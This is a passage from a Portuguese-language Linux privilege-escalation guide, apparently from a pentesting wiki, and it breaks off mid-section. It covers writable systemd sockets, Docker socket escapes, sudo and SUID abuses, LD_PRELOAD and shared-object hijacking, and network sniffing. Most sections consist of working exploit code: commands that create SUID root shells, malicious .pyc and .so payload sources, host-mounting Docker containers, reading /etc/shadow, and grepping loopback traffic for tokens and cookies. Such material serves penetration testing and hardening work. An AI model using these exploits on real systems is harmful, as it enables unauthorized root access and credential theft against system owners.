- `Service`: Especifica o nome da unit de **serviço** a **ativar** em **tráfego de entrada**. Essa configuração só é permitida para sockets com Accept=no. O padrão é o serviço que tem o mesmo nome do socket (com o sufixo substituído). Na maioria dos casos, não deve ser necessário usar essa opção.

### Writable .socket files

Se você encontrar um arquivo `.socket` **gravável**, você pode **adicionar** no início da seção `[Socket]` algo como: `ExecStartPre=/home/kali/sys/backdoor` e o backdoor será executado antes de o socket ser criado. Portanto, você **provavelmente precisará esperar até a máquina ser reiniciada.**\
_Observe que o sistema deve estar usando essa configuração de arquivo socket, caso contrário o backdoor não será executado_

### Socket activation + writable unit path (create missing service)

Outra má configuração de alto impacto é:

- uma socket unit com `Accept=no` e `Service=<name>.service`
- a service unit referenciada está ausente
- um atacante pode escrever em `/etc/systemd/system` (ou outro caminho de busca de units)

Nesse caso, o atacante pode criar `<name>.service` e então gerar tráfego para o socket para que systemd carregue e execute o novo serviço como root.

Fluxo rápido:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### Sockets graváveis

Se você **identificar qualquer socket gravável** (_agora estamos falando de Unix Sockets e não dos arquivos de configuração `.socket`_), então **você pode se comunicar** com esse socket e talvez explorar uma vulnerabilidade.

### Enumerar Unix Sockets
```bash
netstat -a -p --unix
```
### Conexão raw
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exemplo de exploração:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Observe que pode haver alguns **sockets escutando por HTTP** requests (_não estou falando de arquivos .socket, mas dos arquivos que atuam como unix sockets_). Você pode verificar isso com:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
Se o socket **responde com um HTTP** request, então você pode **comunicar-se** com ele e talvez **explorar alguma vulnerabilidade**.

### Writable Docker Socket

O Docker socket, frequentemente encontrado em `/var/run/docker.sock`, é um arquivo crítico que deve ser protegido. Por padrão, ele é writable pelo usuário `root` e pelos membros do grupo `docker`. Possuir acesso de escrita a esse socket pode levar a privilege escalation. Aqui está um resumo de como isso pode ser feito e métodos alternativos caso o Docker CLI não esteja disponível.

#### **Privilege Escalation com Docker CLI**

Se você tiver acesso de escrita ao Docker socket, você pode escalar privilégios usando os seguintes comandos:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Esses comandos permitem que você execute um container com acesso em nível de root ao sistema de arquivos do host.

#### **Using Docker API Directly**

Em casos em que o Docker CLI não está disponível, o socket do Docker ainda pode ser manipulado usando a Docker API e comandos `curl`.

1.  **List Docker Images:** Recupere a lista de imagens disponíveis.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Envie uma solicitação para criar um container que monte o diretório raiz do sistema do host.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Inicie o container recém-criado:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Use `socat` para estabelecer uma conexão com o container, permitindo a execução de comandos dentro dele.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Depois de configurar a conexão `socat`, você pode executar comandos diretamente no container com acesso em nível de root ao sistema de arquivos do host.

### Others

Observe que, se você tiver permissões de escrita sobre o docker socket porque está **dentro do grupo `docker`**, você tem [**mais formas de escalar privilégios**](interesting-groups-linux-pe/index.html#docker-group). Se a [**docker API estiver escutando em uma porta** você também pode conseguir comprometê-la](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Confira **mais formas de escapar de containers ou abusar de container runtimes para escalar privilégios** em:

{{#ref}}
container-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Se você descobrir que pode usar o comando **`ctr`**, leia a página a seguir, pois **você pode abusar dele para escalar privilégios**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Se você descobrir que pode usar o comando **`runc`**, leia a página a seguir, pois **você pode abusar dele para escalar privilégios**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus é um sofisticado sistema de **inter-Process Communication (IPC)** que permite que aplicações interajam e compartilhem dados de forma eficiente. Projetado pensando no sistema Linux moderno, ele oferece uma estrutura robusta para diferentes formas de comunicação entre aplicações.

O sistema é versátil, com suporte a IPC básico que melhora a troca de dados entre processos, lembrando **enhanced UNIX domain sockets**. Além disso, ele ajuda na transmissão de eventos ou sinais, promovendo integração perfeita entre componentes do sistema. Por exemplo, um sinal de um daemon de Bluetooth sobre uma chamada recebida pode fazer um player de música silenciar, melhorando a experiência do usuário. Além disso, o D-Bus oferece suporte a um sistema de objetos remotos, simplificando solicitações de serviço e invocações de métodos entre aplicações, otimizando processos que tradicionalmente eram complexos.

O D-Bus opera em um modelo de **allow/deny**, gerenciando permissões de mensagens (chamadas de método, emissão de sinais, etc.) com base no efeito cumulativo de regras de policy correspondentes. Essas policies especificam interações com o bus, podendo permitir escalada de privilégios por meio da exploração dessas permissões.

Um exemplo de tal policy em `/etc/dbus-1/system.d/wpa_supplicant.conf` é fornecido, detalhando permissões para o usuário root possuir, enviar e receber mensagens de `fi.w1.wpa_supplicant1`.

Policies sem um usuário ou grupo especificado se aplicam universalmente, enquanto policies de contexto "default" se aplicam a tudo que não é coberto por outras policies específicas.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Aprenda como enumerar e explorar uma comunicação D-Bus aqui:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Network**

É sempre interessante enumerar a network e descobrir a posição da máquina.

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Triagem rápida de filtragem outbound

Se o host pode executar comandos, mas os callbacks falham, separe rapidamente filtragem de DNS, transport, proxy e route:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### Portas abertas

Sempre verifique os serviços de rede em execução na máquina com os quais você não conseguiu interagir antes de acessá-la:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
Classifique os listeners pelo target de bind:

- `0.0.0.0` / `[::]`: expostos em todas as interfaces locais.
- `127.0.0.1` / `::1`: somente local (bons candidatos para tunnel/forward).
- IPs internos específicos (por exemplo, `10.x`, `172.16/12`, `192.168.x`, `fe80::`): normalmente alcançáveis apenas a partir de segmentos internos.

### Fluxo de triagem de serviços somente locais

Quando você compromete um host, serviços vinculados a `127.0.0.1` muitas vezes se tornam acessíveis pela primeira vez a partir do seu shell. Um fluxo local rápido é:
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS como um network scanner (modo somente rede)

Além dos local PE checks, o linPEAS pode ser executado como um network scanner focado. Ele usa binaries disponíveis em `$PATH` (normalmente `fping`, `ping`, `nc`, `ncat`) e não instala tooling.
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
Se você passar `-d`, `-p` ou `-i` sem `-t`, linPEAS se comporta como um puro network scanner (pulando o restante das verificações de privilege-escalation).

### Sniffing

Verifique se você consegue sniff traffic. Se conseguir, você pode ser capaz de capturar algumas credentials.
```
timeout 1 tcpdump
```
Verificações práticas rápidas:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`) é especialmente valioso em post-exploitation porque muitos serviços internos expõem tokens/cookies/credentials ali:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
Capture agora, parse depois:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Users

### Enumeração Genérica

Verifique **quem** você é, quais **privileges** você tem, quais **users** estão no sistema, quais podem **login** e quais têm **root privileges**:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Algumas versões do Linux foram afetadas por um bug que permite a usuários com **UID > INT_MAX** escalar privilégios. Mais informações: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** usando: **`systemd-run -t /bin/bash`**

### Groups

Verifique se você é um **membro de algum grupo** que possa conceder privilégios de root:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

Verifique se há algo interessante localizado dentro do clipboard (se possível)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Política de Senhas
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Senhas conhecidas

Se você **conhece qualquer senha** do ambiente, **tente fazer login como cada usuário** usando a senha.

### Su Brute

Se você não se importar em fazer muito barulho e os binários `su` e `timeout` estiverem presentes no computador, você pode tentar fazer brute-force em usuários usando [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) com o parâmetro `-a` também tenta fazer brute-force em usuários.

## Abusos de PATH gravável

### $PATH

Se você descobrir que pode **escrever dentro de alguma pasta do $PATH**, talvez consiga elevar privilégios **criando uma backdoor dentro da pasta gravável** com o nome de algum comando que será executado por um usuário diferente (root idealmente) e que **não é carregado de uma pasta localizada antes** da sua pasta gravável no $PATH.

### SUDO e SUID

Pode ser que você tenha permissão para executar algum comando usando sudo, ou que ele tenha o bit suid. Verifique usando:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Alguns **comandos inesperados permitem ler e/ou escrever arquivos ou até mesmo executar um comando.** Por exemplo:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

A configuração do Sudo pode permitir que um usuário execute algum comando com os privilégios de outro usuário sem saber a senha.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Neste exemplo, o usuário `demo` pode executar `vim` como `root`, então agora é trivial obter uma shell adicionando uma chave ssh no diretório root ou chamando `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Esta diretiva permite que o usuário **defina uma variável de ambiente** enquanto executa algo:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Este exemplo, **baseado na máquina HTB Admirer**, era **vulnerável** a **PYTHONPATH hijacking** para carregar uma biblioteca Python arbitrária enquanto executava o script como root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### `__pycache__` / `.pyc` poisoning gravável em imports Python permitidos por `sudo`

Se um **script Python permitido pelo `sudo`** importa um módulo cujo diretório do pacote contém um **`__pycache__` gravável**, você pode conseguir substituir o `.pyc` em cache e obter execução de código como o usuário privilegiado na próxima importação.

- Por que funciona:
- O CPython armazena caches de bytecode em `__pycache__/module.cpython-<ver>.pyc`.
- O interpretador valida o **header** (magic + metadata de timestamp/hash vinculada ao source), depois executa o objeto de código marshalado armazenado após esse header.
- Se você consegue **deletar e recriar** o arquivo em cache porque o diretório é gravável, um `.pyc` pertencente a root mas não gravável ainda pode ser substituído.
- Caminho típico:
- `sudo -l` mostra um script Python ou wrapper que você pode executar como root.
- Esse script importa um módulo local de `/opt/app/`, `/usr/local/lib/...`, etc.
- O diretório `__pycache__` do módulo importado é gravável pelo seu usuário ou por todos.

Enumeração rápida:
```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```
Se você puder inspecionar o script privilegiado, identifique os módulos importados e o caminho do cache deles:
```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```
Fluxo de abuso:

1. Execute o script permitido por `sudo` uma vez para que o Python crie o arquivo de cache legítimo, se ele ainda não existir.
2. Leia os primeiros 16 bytes do `.pyc` legítimo e reutilize-os no arquivo envenenado.
3. Compile um payload como code object, aplique `marshal.dumps(...)`, apague o arquivo de cache original e recrie-o com o header original mais o seu bytecode malicioso.
4. Execute novamente o script permitido por `sudo` para que o import execute o seu payload como root.

Notas importantes:

- Reutilizar o header original é essencial porque o Python verifica os metadados do cache contra o arquivo-fonte, e não se o corpo do bytecode realmente corresponde ao source.
- Isso é especialmente útil quando o arquivo-fonte é de propriedade do root e não é gravável, mas o diretório `__pycache__` que o contém é.
- O ataque falha se o processo privilegiado usar `PYTHONDONTWRITEBYTECODE=1`, importar de um local com permissões seguras ou remover o acesso de escrita de todos os diretórios no import path.

Estrutura mínima de proof-of-concept:
```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
src = pathlib.Path(d) / "x.py"
src.write_text(payload)
code = compile(src.read_text(), str(src), "exec")
pyc.unlink()
pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```
Hardening:

- Garanta que nenhum diretório no caminho de importação privilegiado do Python seja gravável por usuários com poucos privilégios, incluindo `__pycache__`.
- Para execuções privilegiadas, considere `PYTHONDONTWRITEBYTECODE=1` e verificações periódicas de diretórios `__pycache__` graváveis inesperados.
- Trate módulos Python locais graváveis e diretórios de cache graváveis da mesma forma que trataria scripts shell graváveis ou bibliotecas compartilhadas executadas por root.

### BASH_ENV preservado via sudo env_keep → root shell

Se o sudoers preservar `BASH_ENV` (por exemplo, `Defaults env_keep+="ENV BASH_ENV"`), você pode aproveitar o comportamento de inicialização não interativa do Bash para executar código arbitrário como root ao invocar um comando permitido.

- Por que funciona: para shells não interativos, o Bash avalia `$BASH_ENV` e faz source desse arquivo antes de executar o script-alvo. Muitas regras do sudo permitem executar um script ou um wrapper shell. Se `BASH_ENV` for preservado pelo sudo, seu arquivo é carregado com privilégios de root.

- Requisitos:
- Uma regra do sudo que você possa executar (qualquer alvo que invoque `/bin/bash` de forma não interativa, ou qualquer script bash).
- `BASH_ENV` presente em `env_keep` (verifique com `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Hardening:
- Remova `BASH_ENV` (e `ENV`) de `env_keep`, prefira `env_reset`.
- Evite shell wrappers para comandos permitidos via sudo; use binários minimalistas.
- Considere logging de I/O do sudo e alertas quando variáveis de ambiente preservadas forem usadas.

### Terraform via sudo com `HOME` preservado (!env_reset)

Se o sudo mantiver o ambiente intacto (`!env_reset`) ao permitir `terraform apply`, `$HOME` continua sendo o do usuário que chamou. O Terraform então carrega **$HOME/.terraformrc** como root e respeita `provider_installation.dev_overrides`.

- Aponte o provider necessário para um diretório gravável e coloque um plugin malicioso com o nome do provider (por exemplo, `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform falhará no handshake do plugin Go, mas executa o payload como root antes de morrer, deixando uma shell SUID para trás.

### TF_VAR overrides + symlink validation bypass

As variáveis do Terraform podem ser fornecidas via variáveis de ambiente `TF_VAR_<name>`, que sobrevivem quando o sudo preserva o ambiente. Validações fracas como `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` podem ser contornadas com symlinks:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform resolve o symlink e copia o real `/root/root.txt` para um destino legível pelo attacker. A mesma abordagem pode ser usada para **escrever** em caminhos privilegiados pré-criando symlinks de destino (por exemplo, apontando o path de destino do provider dentro de `/etc/cron.d/`).

### requiretty / !requiretty

Em algumas distribuições mais antigas, sudo pode ser configurado com `requiretty`, o que força o sudo a ser executado apenas a partir de um TTY interativo. Se `!requiretty` estiver definido (ou a opção estiver ausente), sudo pode ser executado a partir de contextos não interativos, como reverse shells, cron jobs ou scripts.
```bash
Defaults !requiretty
```
Isso não é uma vulnerabilidade direta por si só, mas amplia as situações em que regras do sudo podem ser abusadas sem precisar de um PTY completo.

### Sudo env_keep+=PATH / secure_path inseguro → PATH hijack

Se `sudo -l` mostrar `env_keep+=PATH` ou um `secure_path` contendo entradas graváveis pelo atacante (por exemplo, `/home/<user>/bin`), qualquer comando relativo dentro do alvo permitido pelo sudo pode ser substituído.

- Requisitos: uma regra do sudo (muitas vezes `NOPASSWD`) executando um script/binário que chama comandos sem caminhos absolutos (`free`, `df`, `ps`, etc.) e uma entrada de PATH gravável que seja pesquisada primeiro.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Contornar paths de execução do Sudo
**Jump** para ler outros arquivos ou usar **symlinks**. Por exemplo, no arquivo sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Se um **wildcard** for usado (\*), é ainda mais fácil:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Contramedidas**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Comando Sudo/binário SUID sem caminho do comando

Se a **permissão sudo** for dada a um único comando **sem especificar o caminho**: _hacker10 ALL= (root) less_ você pode explorá-la alterando a variável PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Essa técnica também pode ser usada se um binário **suid** **executa outro comando sem especificar o caminho para ele (sempre verifique com** _**strings**_ **o conteúdo de um binário SUID estranho)**.

[Exemplos de payloads para executar.](payloads-to-execute.md)

### Binário SUID com caminho do comando

Se o binário **suid** **executa outro comando especificando o caminho**, então você pode tentar **exportar uma função** com o mesmo nome do comando que o arquivo suid está chamando.

Por exemplo, se um binário suid chama _**/usr/sbin/service apache2 start**_ você terá que tentar criar a função e exportá-la:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Então, quando você chamar o binário SUID, esta função será executada

### Script gravável executado por um wrapper SUID

Uma configuração incorreta comum em aplicativos personalizados é um wrapper de binário SUID pertencente a root que executa um script, enquanto o próprio script é gravável por usuários com poucos privilégios.

Padrão típico:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
Se `/usr/local/bin/backup.sh` for gravável, você pode anexar comandos de payload e então executar o wrapper SUID:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
Verificações rápidas:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
Esse caminho de ataque é especialmente comum em wrappers de "maintenance"/"backup" distribuídos em `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

A variável de ambiente **LD_PRELOAD** é usada para especificar uma ou mais shared libraries (.so files) a serem carregadas pelo loader antes de todas as outras, incluindo a standard C library (`libc.so`). Esse processo é conhecido como preloading de uma library.

No entanto, para manter a segurança do sistema e impedir que esse recurso seja explorado, especialmente com executáveis **suid/sgid**, o sistema impõe certas condições:

- O loader ignora **LD_PRELOAD** para executáveis em que o real user ID (_ruid_) não corresponde ao effective user ID (_euid_).
- Para executáveis com suid/sgid, apenas libraries em paths padrão que também sejam suid/sgid são preloaded.

A privilege escalation pode ocorrer se você tiver a capacidade de executar comandos com `sudo` e a saída de `sudo -l` incluir a instrução **env_keep+=LD_PRELOAD**. Essa configuração permite que a variável de ambiente **LD_PRELOAD** persista e seja reconhecida mesmo quando comandos são executados com `sudo`, podendo levar à execução de arbitrary code com privilégios elevados.
```
Defaults        env_keep += LD_PRELOAD
```
Save as **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Então **compile-o** usando:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Por fim, **escalar privilégios** executando
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Um privesc semelhante pode ser abusado se o atacante controlar a variável de ambiente **LD_LIBRARY_PATH** porque ele controla o caminho onde as bibliotecas vão ser procuradas.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### Binary SUID – injeção de .so

Ao encontrar um binary com permissões **SUID** que pareça incomum, é uma boa prática verificar se ele está carregando arquivos **.so** corretamente. Isso pode ser verificado executando o seguinte command:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Por exemplo, encontrar um erro como _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ sugere uma possível exploração.

Para explorar isso, deve-se prosseguir criando um arquivo C, por exemplo _"/path/to/.config/libcalc.c"_, contendo o seguinte código:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Este código, uma vez compilado e executado, tem como objetivo elevar privilégios manipulando permissões de arquivos e executando um shell com privilégios elevados.

Compile o arquivo C acima em um arquivo de objeto compartilhado (.so) com:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Por fim, executar o binário SUID afetado deve acionar o exploit, permitindo um possível comprometimento do sistema.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Agora que encontramos um binário SUID carregando uma library de uma pasta onde podemos escrever, vamos criar a library nessa pasta com o nome necessário:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Se você receber um erro como
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
that means that the library you have generated need to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) é uma lista curada de binários Unix que pode ser explorada por um atacante para contornar restrições de segurança locais. [**GTFOArgs**](https://gtfoargs.github.io/) é o mesmo, mas para casos em que você pode **apenas injetar argumentos** em um comando.

O projeto coleta funções legítimas de binários Unix que podem ser abusadas para sair de shells restritos, escalar ou manter privilégios elevados, transferir arquivos, abrir bind e reverse shells, e facilitar outras tarefas de post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Se você conseguir acessar `sudo -l`, pode usar a ferramenta [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) para verificar se ela encontra como explorar alguma regra do sudo.

### Reusing Sudo Tokens

Em casos em que você tem **sudo access** mas não a password, você pode escalar privilégios **aguardando a execução de um comando sudo e então sequestrando o token da sessão**.

Requisitos para escalar privilégios:

- Você já tem um shell como usuário "_sampleuser_"
